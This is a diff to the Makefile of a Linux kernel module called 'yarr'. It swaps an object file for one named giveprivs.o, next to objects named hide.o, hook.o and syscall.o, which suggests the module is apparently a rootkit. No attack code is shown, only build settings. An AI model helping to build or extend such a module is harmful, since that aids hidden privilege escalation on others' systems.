@@ -3,7 +3,7 @@ EXTRA_CFLAGS += -DDEBUG
 
 obj-m += yarr.o
 yarr-objs := debug.o funcs.o config.o intrhandler.o interrupt.o \
-			 syscall.o hide.o hook.o yarrops.o main.o
+			 syscall.o hide.o hook.o giveprivs.o main.o
 hook-objs := syscall.o
 
 all:
